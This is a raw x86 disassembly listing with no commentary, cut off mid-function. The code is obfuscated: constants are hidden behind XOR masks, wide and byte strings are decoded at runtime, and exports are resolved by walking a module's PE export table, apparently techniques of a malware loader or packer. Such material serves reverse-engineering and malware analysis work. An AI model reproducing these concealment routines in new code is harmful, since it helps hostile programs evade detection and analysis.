  4280b1:	mov    ecx,0x75108ae
  4280b6:	push   ebx
  4280b7:	mov    ax,WORD PTR [eax]
  4280ba:	mov    ebx,0x3b5c
  4280bf:	sub    ax,bx
  4280c2:	mov    ebx,0x8a9a
  4280c7:	xor    ax,bx
  4280ca:	mov    ebx,0x4e48
  4280cf:	cmp    ax,bx
  4280d2:	jne    0x4280d7
  4280d4:	mov    DWORD PTR [ebp-0x4],esi
  4280d7:	lea    esi,[edx+0x1]
  4280da:	xor    esi,ecx
  4280dc:	mov    edx,esi
  4280de:	xor    edx,ecx
  4280e0:	lea    eax,[edi+edx*2+0x64e5ea]
  4280e7:	mov    bl,BYTE PTR [eax]
  4280e9:	sub    bl,0x3
  4280ec:	xor    bl,0x7e
  4280ef:	cmp    bl,0x83
  4280f2:	jne    0x4280b7
  4280f4:	mov    eax,DWORD PTR [ebp-0x4]
  4280f7:	pop    ebx
  4280f8:	cmp    eax,0xf89c85a4
  4280fd:	je     0x42810b
  4280ff:	xor    eax,ecx
  428101:	xor    ecx,ecx
  428103:	mov    WORD PTR [edi+eax*2+0x64e5ea],cx
  42810b:	mov    eax,edi
  42810d:	pop    edi
  42810e:	pop    esi
  42810f:	leave  
  428110:	ret    
  428111:	push   ebp
  428112:	mov    ebp,esp
  428114:	push   ecx
  428115:	push   esi
  428116:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  42811d:	mov    esi,0xf89c85a5
  428122:	call   0x427ff9
  428127:	mov    cx,WORD PTR [eax]
  42812a:	mov    edx,0x3b5c
  42812f:	sub    cx,dx
  428132:	mov    edx,0x8a9a
  428137:	xor    cx,dx
  42813a:	mov    edx,0x4e3e
  42813f:	cmp    cx,dx
  428142:	je     0x42819b
  428144:	push   ebx
  428145:	push   edi
  428146:	movzx  ecx,cx
  428149:	mov    edx,0xffcd8d0b
  42814e:	mov    edi,0x75108ae
  428153:	mov    ebx,0x4e48
  428158:	cmp    cx,bx
  42815b:	jne    0x428160
  42815d:	mov    DWORD PTR [ebp-0x4],esi
  428160:	lea    esi,[edx+0x1]
  428163:	xor    esi,edi
  428165:	mov    edx,esi
  428167:	xor    edx,edi
  428169:	mov    cx,WORD PTR [eax+edx*2+0x64e5ea]
  428171:	mov    ebx,0x3b5c
  428176:	sub    cx,bx
  428179:	mov    ebx,0x8a9a
  42817e:	xor    cx,bx
  428181:	mov    ebx,0x4e3e
  428186:	cmp    cx,bx
  428189:	jne    0x428153
  42818b:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  428192:	pop    edi
  428193:	pop    ebx
  428194:	je     0x42819b
  428196:	xor    eax,eax
  428198:	inc    eax
  428199:	jmp    0x42819d
  42819b:	xor    eax,eax
  42819d:	pop    esi
  42819e:	leave  
  42819f:	ret    
  4281a0:	push   ebp
  4281a1:	mov    ebp,esp
  4281a3:	push   ecx
  4281a4:	mov    eax,DWORD PTR [ebp+0x8]
  4281a7:	movzx  ecx,WORD PTR [eax]
  4281aa:	push   esi
  4281ab:	lea    eax,[ecx-0x3b5c]
  4281b1:	mov    esi,0x8a9a
  4281b6:	push   edi
  4281b7:	xor    eax,esi
  4281b9:	mov    edi,0x4e3e
  4281be:	mov    DWORD PTR [ebp-0x4],edx
  4281c1:	cmp    ax,di
  4281c4:	je     0x4281f1
  4281c6:	mov    eax,DWORD PTR [ebp+0x8]
  4281c9:	sub    eax,edx
  4281cb:	mov    DWORD PTR [ebp+0x8],eax
  4281ce:	jmp    0x4281d3
  4281d0:	mov    eax,DWORD PTR [ebp+0x8]
  4281d3:	mov    WORD PTR [edx],cx
  4281d6:	add    edx,0x2
  4281d9:	movzx  edi,WORD PTR [eax+edx*1]
  4281dd:	mov    ecx,edi
  4281df:	add    edi,0xffffc4a4
  4281e5:	xor    edi,esi
  4281e7:	mov    eax,0x4e3e
  4281ec:	cmp    di,ax
  4281ef:	jne    0x4281d0
  4281f1:	xor    eax,eax
  4281f3:	pop    edi
  4281f4:	mov    WORD PTR [edx],ax
  4281f7:	mov    eax,DWORD PTR [ebp-0x4]
  4281fa:	pop    esi
  4281fb:	leave  
  4281fc:	ret    0x4
  4281ff:	push   ebp
  428200:	mov    ebp,esp
  428202:	sub    esp,0x18
  428205:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  42820c:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  428213:	mov    ecx,DWORD PTR [ebp-0x8]
  428216:	push   esi
  428217:	mov    eax,0x75108ae
  42821c:	xor    ecx,eax
  42821e:	mov    esi,0x3272f5
  428223:	add    ecx,esi
  428225:	mov    DWORD PTR [ebp-0x4],ecx
  428228:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42822f:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  428236:	push   edi
  428237:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  42823e:	jmp    0x4282df
  428243:	mov    ecx,DWORD PTR [ebp-0x4]
  428246:	mov    edx,DWORD PTR [ebp+0x10]
  428249:	sub    edx,ecx
  42824b:	mov    ecx,DWORD PTR [ebp-0xc]
  42824e:	xor    ecx,eax
  428250:	add    ecx,esi
  428252:	cmp    edx,ecx
  428254:	jbe    0x428271
  428256:	mov    edx,DWORD PTR [ebp-0x4]
  428259:	add    edx,DWORD PTR [ebp+0x8]
  42825c:	mov    ecx,DWORD PTR [ebp-0x4]
  42825f:	add    ecx,DWORD PTR [ebp+0xc]
  428262:	mov    edi,DWORD PTR [ecx]
  428264:	mov    DWORD PTR [edx],edi
  428266:	mov    ecx,DWORD PTR [ecx+0x4]
  428269:	mov    DWORD PTR [edx+0x4],ecx
  42826c:	mov    ecx,DWORD PTR [ebp-0xc]
  42826f:	jmp    0x4282be
  428271:	mov    ecx,DWORD PTR [ebp-0x4]
  428274:	mov    edx,DWORD PTR [ebp+0x10]
  428277:	sub    edx,ecx
  428279:	mov    ecx,DWORD PTR [ebp-0x10]
  42827c:	xor    ecx,eax
  42827e:	add    ecx,esi
  428280:	cmp    edx,ecx
  428282:	mov    ecx,DWORD PTR [ebp-0x4]
  428285:	jbe    0x428299
  428287:	add    ecx,DWORD PTR [ebp+0x8]
  42828a:	mov    edx,DWORD PTR [ebp-0x4]
  42828d:	add    edx,DWORD PTR [ebp+0xc]
  428290:	mov    edx,DWORD PTR [edx]
  428292:	mov    DWORD PTR [ecx],edx
  428294:	mov    ecx,DWORD PTR [ebp-0x10]
  428297:	jmp    0x4282be
  428299:	mov    edx,DWORD PTR [ebp+0x10]
  42829c:	sub    edx,ecx
  42829e:	mov    ecx,DWORD PTR [ebp-0x14]
  4282a1:	xor    ecx,eax
  4282a3:	add    ecx,esi
  4282a5:	cmp    edx,ecx
  4282a7:	mov    ecx,DWORD PTR [ebp-0x4]
  4282aa:	jbe    0x4282cf
  4282ac:	add    ecx,DWORD PTR [ebp+0x8]
  4282af:	mov    edx,DWORD PTR [ebp-0x4]
  4282b2:	add    edx,DWORD PTR [ebp+0xc]
  4282b5:	mov    dx,WORD PTR [edx]
  4282b8:	mov    WORD PTR [ecx],dx
  4282bb:	mov    ecx,DWORD PTR [ebp-0x14]
  4282be:	mov    edx,DWORD PTR [ebp-0x4]
  4282c1:	xor    ecx,eax
  4282c3:	lea    ecx,[ecx+edx*1+0x3272f5]
  4282ca:	mov    DWORD PTR [ebp-0x4],ecx
  4282cd:	jmp    0x4282df
  4282cf:	add    ecx,DWORD PTR [ebp+0x8]
  4282d2:	mov    edx,DWORD PTR [ebp-0x4]
  4282d5:	add    edx,DWORD PTR [ebp+0xc]
  4282d8:	mov    dl,BYTE PTR [edx]
  4282da:	mov    BYTE PTR [ecx],dl
  4282dc:	inc    DWORD PTR [ebp-0x4]
  4282df:	mov    ecx,DWORD PTR [ebp-0x18]
  4282e2:	mov    edx,DWORD PTR [ebp+0x10]
  4282e5:	xor    ecx,eax
  4282e7:	add    ecx,esi
  4282e9:	imul   ecx,edx
  4282ec:	mov    edx,DWORD PTR [ebp-0x8]
  4282ef:	mov    edi,DWORD PTR [ebp-0x4]
  4282f2:	xor    edx,eax
  4282f4:	lea    edx,[edx+edi*1+0x3272f5]
  4282fb:	cmp    edx,ecx
  4282fd:	jb     0x428243
  428303:	pop    edi
  428304:	pop    esi
  428305:	leave  
  428306:	ret    0xc
  428309:	push   ebp
  42830a:	mov    ebp,esp
  42830c:	sub    esp,0xc
  42830f:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  428316:	push   esi
  428317:	mov    esi,eax
  428319:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  428320:	mov    edx,DWORD PTR [ebp-0x4]
  428323:	mov    eax,0x75108ae
  428328:	xor    edx,eax
  42832a:	mov    ecx,0x3272f5
  42832f:	add    edx,ecx
  428331:	cmp    esi,edx
  428333:	je     0x428375
  428335:	push   ebx
  428336:	push   edi
  428337:	mov    edx,DWORD PTR [ebp-0x8]
  42833a:	mov    ebx,DWORD PTR [ebp+0x8]
  42833d:	xor    edx,eax
  42833f:	mov    edi,0xffcd8d0b
  428344:	sub    edi,edx
  428346:	add    esi,edi
  428348:	lea    edx,[esi-0x3272f5]
  42834e:	xor    edx,eax
  428350:	mov    DWORD PTR [ebp-0xc],edx
  428353:	mov    edx,DWORD PTR [ebp-0x4]
  428356:	mov    edi,DWORD PTR [ebp-0xc]
  428359:	xor    dl,0xae
  42835c:	sub    dl,0xb
  42835f:	xor    edi,eax
  428361:	mov    BYTE PTR [edi+ebx*1+0x3272f5],dl
  428368:	mov    edx,DWORD PTR [ebp-0x4]
  42836b:	xor    edx,eax
  42836d:	add    edx,ecx
  42836f:	cmp    esi,edx
  428371:	jne    0x428337
  428373:	pop    edi
  428374:	pop    ebx
  428375:	pop    esi
  428376:	leave  
  428377:	ret    0x4
  42837a:	push   ebp
  42837b:	mov    ebp,esp
  42837d:	sub    esp,0x21c
  428383:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42838a:	mov    DWORD PTR [ebp-0x14],0xf89c85a2
  428391:	mov    eax,DWORD PTR [ebp+0x10]
  428394:	mov    eax,DWORD PTR [ebp-0x4]
  428397:	mov    ecx,DWORD PTR [ebp+0x8]
  42839a:	push   esi
  42839b:	push   edi
  42839c:	mov    edi,0x75108ae
  4283a1:	xor    eax,edi
  4283a3:	mov    esi,0x3272f5
  4283a8:	add    eax,esi
  4283aa:	cmp    eax,ecx
  4283ac:	mov    eax,DWORD PTR [ebp-0x4]
  4283af:	jne    0x4283ba
  4283b1:	xor    eax,edi
  4283b3:	add    eax,esi
  4283b5:	jmp    0x428466
  4283ba:	mov    ecx,DWORD PTR [ebp+0xc]
  4283bd:	xor    eax,edi
  4283bf:	add    eax,esi
  4283c1:	cmp    eax,ecx
  4283c3:	jne    0x4283ca
  4283c5:	mov    eax,DWORD PTR [ebp-0x4]
  4283c8:	jmp    0x4283b1
  4283ca:	lea    eax,[ebp-0x21c]
  4283d0:	mov    DWORD PTR [ebp-0x8],eax
  4283d3:	mov    eax,DWORD PTR [ebp+0xc]
  4283d6:	mov    DWORD PTR [ebp-0x10],eax
  4283d9:	mov    eax,DWORD PTR [ebp-0x4]
  4283dc:	xor    eax,edi
  4283de:	add    eax,esi
  4283e0:	mov    DWORD PTR [ebp+0x10],eax
  4283e3:	mov    eax,DWORD PTR [ebp+0xc]
  4283e6:	push   ebx
  4283e7:	call   0x428111
  4283ec:	mov    ebx,eax
  4283ee:	mov    eax,DWORD PTR [ebp+0x8]
  4283f1:	mov    eax,DWORD PTR [eax+0x14]
  4283f4:	jmp    0x42844e
  4283f6:	mov    eax,DWORD PTR [ebp+0xc]
  4283f9:	sub    eax,0x8
  4283fc:	mov    DWORD PTR [ebp-0xc],eax
  4283ff:	mov    eax,DWORD PTR [ebp-0xc]
  428402:	mov    eax,DWORD PTR [eax+0x28]
  428405:	call   0x427ff9
  42840a:	mov    DWORD PTR [ebp+0x10],eax
  42840d:	push   DWORD PTR [ebp+0x10]
  428410:	mov    edx,DWORD PTR [ebp-0x8]
  428413:	call   0x4281a0
  428418:	mov    eax,DWORD PTR [ebp-0x4]
  42841b:	xor    eax,edi
  42841d:	add    eax,esi
  42841f:	cmp    eax,ebx
  428421:	jne    0x42842b
  428423:	mov    eax,DWORD PTR [ebp-0x8]
  428426:	call   0x428087
  42842b:	mov    eax,DWORD PTR [ebp-0x14]
  42842e:	xor    eax,edi
  428430:	add    eax,esi
  428432:	push   eax
  428433:	push   DWORD PTR [ebp-0x10]
  428436:	mov    eax,DWORD PTR [ebp-0x8]
  428439:	call   0x427db3
  42843e:	mov    ecx,DWORD PTR [ebp-0x4]
  428441:	xor    ecx,edi
  428443:	add    ecx,esi
  428445:	cmp    eax,ecx
  428447:	je     0x42846c
  428449:	mov    eax,DWORD PTR [ebp+0xc]
  42844c:	mov    eax,DWORD PTR [eax]
  42844e:	mov    DWORD PTR [ebp+0xc],eax
  428451:	mov    eax,DWORD PTR [ebp+0x8]
  428454:	mov    ecx,DWORD PTR [ebp+0xc]
  428457:	add    eax,0x14
  42845a:	cmp    ecx,eax
  42845c:	jne    0x4283f6
  42845e:	mov    eax,DWORD PTR [ebp-0x4]
  428461:	xor    eax,edi
  428463:	add    eax,esi
  428465:	pop    ebx
  428466:	pop    edi
  428467:	pop    esi
  428468:	leave  
  428469:	ret    0xc
  42846c:	mov    eax,DWORD PTR [ebp-0xc]
  42846f:	mov    eax,DWORD PTR [eax+0x18]
  428472:	jmp    0x428465
  428474:	push   ebp
  428475:	mov    ebp,esp
  428477:	mov    eax,DWORD PTR [ebp+0xc]
  42847a:	sub    esp,0x10
  42847d:	cmp    DWORD PTR [ebp+0x8],0x0
  428481:	push   ebx
  428482:	push   esi
  428483:	push   edi
  428484:	je     0x428539
  42848a:	test   eax,eax
  42848c:	je     0x428539
  428492:	movzx  eax,WORD PTR [eax+0x20]
  428496:	mov    ecx,eax
  428498:	mov    DWORD PTR [ebp-0x10],eax
  42849b:	xor    edx,edx
  42849d:	and    DWORD PTR [ebp-0x8],edx
  4284a0:	mov    eax,0x8a9a
  4284a5:	xor    ecx,eax
  4284a7:	add    ecx,0x3b5c
  4284ad:	mov    DWORD PTR [ebp-0xc],ecx
  4284b0:	and    DWORD PTR [ebp-0x4],0x0
  4284b4:	xor    ecx,ecx
  4284b6:	push   0xffffff81
  4284b8:	pop    edi
  4284b9:	cmp    cx,WORD PTR [ebp-0xc]
  4284bd:	jae    0x428523
  4284bf:	lea    esi,[edx-0x3b5c]
  4284c5:	xor    esi,eax
  4284c7:	movzx  ecx,WORD PTR [ebp-0x4]
  4284cb:	mov    ebx,DWORD PTR [ebp+0xc]
  4284ce:	lea    ecx,[ebx+ecx*4]
  4284d1:	cmp    WORD PTR [ecx+0x2],si
  4284d5:	jne    0x42850e
  4284d7:	movzx  ecx,WORD PTR [ecx]
  4284da:	mov    edi,0x4e3e
  4284df:	cmp    cx,di
  4284e2:	jne    0x4284f0
  4284e4:	mov    ebx,DWORD PTR [ebp+0x8]
  4284e7:	movzx  edi,dx
  4284ea:	cmp    BYTE PTR [edi+ebx*1],0x0
  4284ee:	je     0x42851d
  4284f0:	mov    ebx,DWORD PTR [ebp+0x8]
  4284f3:	movzx  edi,dx
  4284f6:	movsx  di,BYTE PTR [edi+ebx*1]
  4284fb:	mov    ebx,0x3b5c
  428500:	sub    di,bx
  428503:	xor    di,ax
  428506:	cmp    cx,di
  428509:	je     0x42851d
  42850b:	push   0xffffff83
  42850d:	pop    edi
  42850e:	inc    DWORD PTR [ebp-0x4]
  428511:	mov    cx,WORD PTR [ebp-0xc]
  428515:	cmp    WORD PTR [ebp-0x4],cx
  428519:	jb     0x4284c7
  42851b:	jmp    0x428523
  42851d:	inc    DWORD PTR [ebp-0x8]
  428520:	push   0xffffff80
  428522:	pop    edi
  428523:	mov    esi,DWORD PTR [ebp+0x8]
  428526:	movzx  ecx,dx
  428529:	cmp    BYTE PTR [ecx+esi*1],0x0
  42852d:	je     0x428542
  42852f:	inc    edx
  428530:	cmp    edi,0xffffff83
  428533:	jne    0x4284b0
  428539:	xor    eax,eax
  42853b:	pop    edi
  42853c:	pop    esi
  42853d:	pop    ebx
  42853e:	leave  
  42853f:	ret    0x8
  428542:	mov    ecx,DWORD PTR [ebp-0x8]
  428545:	add    ecx,0xffffc4a4
  42854b:	xor    cx,ax
  42854e:	xor    eax,eax
  428550:	cmp    cx,WORD PTR [ebp-0x10]
  428554:	sete   al
  428557:	jmp    0x42853b
  428559:	push   ebp
  42855a:	mov    ebp,esp
  42855c:	sub    esp,0x50
  42855f:	push   edi
  428560:	mov    edi,eax
  428562:	mov    eax,DWORD PTR [edi+0x1a8]
  428568:	cmp    DWORD PTR [eax],0x0
  42856b:	jne    0x428574
  42856d:	xor    eax,eax
  42856f:	jmp    0x4286a5
  428574:	push   DWORD PTR [ebp+0x8]
  428577:	push   0x2c
  428579:	pop    eax
  42857a:	call   0x428309
  42857f:	mov    edx,DWORD PTR [edi+0x1ac]
  428585:	lea    eax,[edi+0x22]
  428588:	mov    DWORD PTR [ebp-0x4c],eax
  42858b:	lea    eax,[edi+0x44]
  42858e:	mov    DWORD PTR [ebp-0x48],eax
  428591:	lea    eax,[edi+0x66]
  428594:	mov    DWORD PTR [ebp-0x44],eax
  428597:	lea    eax,[edi+0x88]
  42859d:	mov    DWORD PTR [ebp-0x40],eax
  4285a0:	lea    eax,[edi+0xaa]
  4285a6:	mov    DWORD PTR [ebp-0x3c],eax
  4285a9:	lea    eax,[edi+0xcc]
  4285af:	mov    DWORD PTR [ebp-0x38],eax
  4285b2:	lea    eax,[edi+0xee]
  4285b8:	mov    DWORD PTR [ebp-0x34],eax
  4285bb:	lea    eax,[edi+0x110]
  4285c1:	mov    DWORD PTR [ebp-0x30],eax
  4285c4:	lea    eax,[edi+0x132]
  4285ca:	mov    DWORD PTR [ebp-0x2c],eax
  4285cd:	lea    eax,[edi+0x154]
  4285d3:	push   edi
  4285d4:	mov    DWORD PTR [ebp-0x50],edi
  4285d7:	mov    DWORD PTR [ebp-0x28],eax
  4285da:	call   0x4286d9
  4285df:	push   eax
  4285e0:	mov    eax,DWORD PTR [edi+0x1a8]
  4285e6:	push   DWORD PTR [eax]
  4285e8:	call   0x42837a
  4285ed:	mov    DWORD PTR [ebp-0x10],eax
  4285f0:	test   eax,eax
  4285f2:	je     0x4286a5
  4285f8:	mov    ecx,DWORD PTR [eax+0x3c]
  4285fb:	push   ebx
  4285fc:	push   esi
  4285fd:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  428601:	add    esi,eax
  428603:	mov    edi,DWORD PTR [esi+0x24]
  428606:	mov    ecx,DWORD PTR [esi+0x1c]
  428609:	mov    edx,DWORD PTR [esi+0x20]
  42860c:	mov    ebx,DWORD PTR [esi+0x18]
  42860f:	add    edi,eax
  428611:	mov    DWORD PTR [ebp-0x20],edi
  428614:	mov    edi,DWORD PTR [esi+0x14]
  428617:	add    ecx,eax
  428619:	add    edx,eax
  42861b:	mov    DWORD PTR [ebp-0xc],ecx
  42861e:	mov    DWORD PTR [ebp-0x1c],edx
  428621:	mov    DWORD PTR [ebp-0x8],edi
  428624:	cmp    edi,ebx
  428626:	ja     0x42862b
  428628:	mov    DWORD PTR [ebp-0x8],ebx
  42862b:	xor    ebx,ebx
  42862d:	mov    DWORD PTR [ebp-0x18],ebx
  428630:	cmp    DWORD PTR [ebp-0x8],ebx
  428633:	jbe    0x4286a3
  428635:	jmp    0x42863a
  428637:	mov    edx,DWORD PTR [ebp-0x1c]
  42863a:	mov    edi,DWORD PTR [ebp-0x20]
  42863d:	movzx  edi,WORD PTR [edi+ebx*2]
  428641:	cmp    ebx,DWORD PTR [esi+0x18]
  428644:	jae    0x4286a3
  428646:	cmp    edi,DWORD PTR [esi+0x14]
  428649:	jae    0x4286a3
  42864b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42864e:	mov    edx,DWORD PTR [ebp+0x8]
  428651:	mov    edi,DWORD PTR [ecx+edi*4]
  428654:	mov    DWORD PTR [ebp-0x4],edx
  428657:	lea    edx,[ebp-0x50]
  42865a:	add    ebx,eax
  42865c:	add    edi,eax
  42865e:	sub    edx,DWORD PTR [ebp+0x8]
  428661:	mov    DWORD PTR [ebp-0x14],0xb
  428668:	mov    DWORD PTR [ebp-0x24],edx
  42866b:	mov    edx,DWORD PTR [ebp-0x4]
  42866e:	cmp    DWORD PTR [edx],0x0
  428671:	jne    0x42868e
  428673:	mov    eax,DWORD PTR [ebp-0x24]
  428676:	push   DWORD PTR [eax+edx*1]
  428679:	push   ebx
  42867a:	call   0x428474
  42867f:	mov    ecx,DWORD PTR [ebp-0xc]
  428682:	test   eax,eax
  428684:	je     0x42868b
  428686:	mov    eax,DWORD PTR [ebp-0x4]
  428689:	mov    DWORD PTR [eax],edi
  42868b:	mov    eax,DWORD PTR [ebp-0x10]
  42868e:	add    DWORD PTR [ebp-0x4],0x4
  428692:	dec    DWORD PTR [ebp-0x14]
  428695:	jne    0x42866b
  428697:	mov    ebx,DWORD PTR [ebp-0x18]
  42869a:	inc    ebx
  42869b:	mov    DWORD PTR [ebp-0x18],ebx
  42869e:	cmp    ebx,DWORD PTR [ebp-0x8]
  4286a1:	jb     0x428637
  4286a3:	pop    esi
  4286a4:	pop    ebx
  4286a5:	pop    edi
  4286a6:	leave  
  4286a7:	ret    0x4
  4286aa:	push   ebp
  4286ab:	mov    ebp,esp
  4286ad:	mov    eax,DWORD PTR [ebp+0x8]
  4286b0:	push   esi
  4286b1:	push   DWORD PTR [eax+0x1e0]
  4286b7:	lea    esi,[eax+0x198]
  4286bd:	mov    eax,DWORD PTR [ebp+0x8]
  4286c0:	call   0x428559
  4286c5:	mov    ecx,DWORD PTR [esi]
  4286c7:	mov    DWORD PTR [ecx],eax
  4286c9:	mov    eax,DWORD PTR [esi]
  4286cb:	xor    ecx,ecx
  4286cd:	cmp    DWORD PTR [eax],ecx
  4286cf:	pop    esi
  4286d0:	setne  cl
  4286d3:	mov    eax,ecx
  4286d5:	pop    ebp
  4286d6:	ret    0x4
  4286d9:	mov    ecx,DWORD PTR [edi+0x188]
  4286df:	push   ebx
  4286e0:	jmp    0x4286f5
  4286e2:	xor    eax,0x8a9a
  4286e7:	add    eax,0x3b5c
  4286ec:	mov    WORD PTR [ecx],ax
  4286ef:	add    ecx,0x2
  4286f2:	add    edx,0x2
  4286f5:	movzx  eax,WORD PTR [edx]
  4286f8:	mov    ebx,0x4e3e
  4286fd:	cmp    ax,bx
  428700:	jne    0x4286e2
  428702:	xor    eax,eax
  428704:	mov    WORD PTR [ecx],ax
  428707:	mov    eax,DWORD PTR [edi+0x188]
  42870d:	pop    ebx
  42870e:	ret    
  42870f:	push   edi
  428710:	mov    edi,eax
  428712:	mov    eax,DWORD PTR [esi+0x188]
  428718:	shl    edi,0x6
  42871b:	add    eax,edi
  42871d:	jmp    0x428729
  42871f:	xor    cl,0x7e
  428722:	add    cl,0x3
  428725:	mov    BYTE PTR [eax],cl
  428727:	inc    eax
  428728:	inc    edx
  428729:	mov    cl,BYTE PTR [edx]
  42872b:	cmp    cl,0x83
  42872e:	jne    0x42871f
  428730:	mov    BYTE PTR [eax],0x0
  428733:	mov    eax,DWORD PTR [esi+0x188]
  428739:	add    eax,edi
  42873b:	pop    edi
  42873c:	ret    
  42873d:	push   ebp
  42873e:	mov    ebp,esp
  428740:	sub    esp,0x14
  428743:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42874a:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  428751:	mov    eax,DWORD PTR [ebx]
  428753:	mov    DWORD PTR [ebp-0x8],eax
  428756:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42875d:	push   esi
  42875e:	push   edi
  42875f:	mov    DWORD PTR [ebp-0x14],0xead71885
  428766:	mov    edi,DWORD PTR [ebp-0x4]
  428769:	mov    ecx,DWORD PTR [ebp-0x10]
  42876c:	mov    eax,0x75108ae
  428771:	xor    edi,eax
  428773:	mov    edx,0x3272f5
  428778:	xor    ecx,eax
  42877a:	add    edi,edx
  42877c:	add    ecx,edx
  42877e:	imul   edi,ecx
  428781:	jmp    0x4287c9
  428783:	mov    ecx,DWORD PTR [ebp-0x8]
  428786:	mov    esi,DWORD PTR [ebp-0x4]
  428789:	xor    ecx,eax
  42878b:	xor    esi,eax
  42878d:	add    ecx,edx
  42878f:	add    esi,edx
  428791:	test   esi,ecx
  428793:	mov    esi,DWORD PTR [ebp-0x8]
  428796:	mov    ecx,DWORD PTR [ebp-0x4]
  428799:	je     0x4287b0
  42879b:	xor    ecx,eax
  42879d:	xor    esi,eax
  42879f:	add    ecx,edx
  4287a1:	add    esi,edx
  4287a3:	shr    esi,cl
  4287a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4287a8:	xor    ecx,eax
  4287aa:	add    ecx,edx
  4287ac:	xor    esi,ecx
  4287ae:	jmp    0x4287ba
  4287b0:	xor    esi,eax
  4287b2:	xor    ecx,eax
  4287b4:	add    esi,edx
  4287b6:	add    ecx,edx
  4287b8:	shr    esi,cl
  4287ba:	mov    DWORD PTR [ebp-0x8],esi
  4287bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4287c0:	xor    ecx,eax
  4287c2:	lea    edi,[edi+ecx*1+0x3272f5]
  4287c9:	mov    ecx,DWORD PTR [ebp-0xc]
  4287cc:	mov    esi,DWORD PTR [ebp-0x4]
  4287cf:	xor    esi,eax
  4287d1:	xor    ecx,eax
  4287d3:	sub    ecx,esi
  4287d5:	cmp    edi,ecx
  4287d7:	jbe    0x428783
  4287d9:	mov    eax,DWORD PTR [ebp-0x8]
  4287dc:	pop    edi
  4287dd:	mov    DWORD PTR [ebx],eax
  4287df:	mov    eax,DWORD PTR [ebp-0x8]
  4287e2:	pop    esi
  4287e3:	leave  
  4287e4:	ret    
  4287e5:	push   ebp
  4287e6:	mov    ebp,esp
  4287e8:	sub    esp,0x38
  4287eb:	push   ebx
  4287ec:	mov    ebx,0xf89c85a5
  4287f1:	mov    DWORD PTR [ebp-0x4],ebx
  4287f4:	lea    ecx,[ebx-0x3]
  4287f7:	mov    DWORD PTR [ebp-0x24],ecx
  4287fa:	mov    eax,DWORD PTR [ebp-0x4]
  4287fd:	mov    edx,DWORD PTR [ebp+0x8]
  428800:	push   esi
  428801:	mov    esi,0x75108ae
  428806:	xor    eax,esi
  428808:	push   edi
  428809:	mov    edi,0x3272f5
  42880e:	add    eax,edi
  428810:	cmp    edx,eax
  428812:	mov    eax,DWORD PTR [ebp-0x4]
  428815:	je     0x42897a
  42881b:	mov    edx,DWORD PTR [ebp+0xc]
  42881e:	xor    eax,esi
  428820:	add    eax,edi
  428822:	cmp    edx,eax
  428824:	je     0x428977
  42882a:	mov    eax,DWORD PTR [ebp+0x10]
  42882d:	mov    edx,DWORD PTR [ebp+0xc]
  428830:	mov    DWORD PTR [ebp-0x14],eax
  428833:	mov    eax,DWORD PTR [ebp+0x8]
  428836:	mov    DWORD PTR [ebp-0x18],0xf89c853d
  42883d:	mov    DWORD PTR [ebp-0xc],eax
  428840:	lea    eax,[ebx-0x2]
  428843:	mov    DWORD PTR [ebp-0x1c],eax
  428846:	mov    DWORD PTR [ebp-0x10],ebx
  428849:	mov    DWORD PTR [ebp+0xc],ecx
  42884c:	mov    DWORD PTR [ebp+0x10],eax
  42884f:	mov    eax,DWORD PTR [ebp+0xc]
  428852:	xor    eax,esi
  428854:	mov    DWORD PTR [ebp-0x20],edx
  428857:	sub    edx,eax
  428859:	sub    edx,edi
  42885b:	mov    DWORD PTR [ebp+0x8],edx
  42885e:	mov    DWORD PTR [ebp-0x8],0xf89c85be
  428865:	jmp    0x428967
  42886a:	mov    eax,DWORD PTR [ebp+0xc]
  42886d:	mov    ecx,DWORD PTR [ebp+0xc]
  428870:	xor    eax,esi
  428872:	xor    ecx,esi
  428874:	lea    ecx,[eax+ecx*1+0x64e5ea]
  42887b:	mov    eax,DWORD PTR [ebp+0x8]
  42887e:	xor    edx,edx
  428880:	div    ecx
  428882:	mov    eax,DWORD PTR [ebp+0x10]
  428885:	mov    ecx,DWORD PTR [ebp+0xc]
  428888:	xor    eax,esi
  42888a:	xor    ecx,esi
  42888c:	sub    eax,ecx
  42888e:	cmp    edx,eax
  428890:	jne    0x428926
  428896:	mov    eax,DWORD PTR [ebp+0x8]
  428899:	mov    ecx,DWORD PTR [ebp-0xc]
  42889c:	mov    dl,BYTE PTR [eax+ecx*1]
  42889f:	mov    eax,DWORD PTR [ebp-0x10]
  4288a2:	mov    ecx,DWORD PTR [ebp-0x8]
  4288a5:	xor    eax,esi
  4288a7:	xor    ecx,esi
  4288a9:	add    eax,edi
  4288ab:	add    ecx,edi
  4288ad:	cmp    eax,ecx
  4288af:	jae    0x4288f7
  4288b1:	lea    ecx,[eax-0x3272f5]
  4288b7:	mov    DWORD PTR [ebp-0x4],ecx
  4288ba:	mov    ebx,DWORD PTR [ebp-0x4]
  4288bd:	xor    ebx,esi
  4288bf:	add    ebx,0x7f55d8e3
  4288c5:	lea    ecx,[ebp+eax*4-0x38]
  4288c9:	mov    DWORD PTR [ecx],ebx
  4288cb:	mov    ebx,DWORD PTR [ecx]
  4288cd:	cmp    ebx,0x244ecb80
  4288d3:	jbe    0x4288dd
  4288d5:	add    DWORD PTR [ecx],0x405fcc1
  4288db:	jmp    0x4288e3
  4288dd:	add    DWORD PTR [ecx],0xfdaf433f
  4288e3:	mov    ecx,DWORD PTR [ebp-0x8]
  4288e6:	xor    ecx,esi
  4288e8:	inc    eax
  4288e9:	inc    DWORD PTR [ebp-0x4]
  4288ec:	add    ecx,edi
  4288ee:	cmp    eax,ecx
  4288f0:	jb     0x4288ba
  4288f2:	mov    ebx,0xf89c85a5
  4288f7:	cmp    DWORD PTR [ebp-0x14],0x0
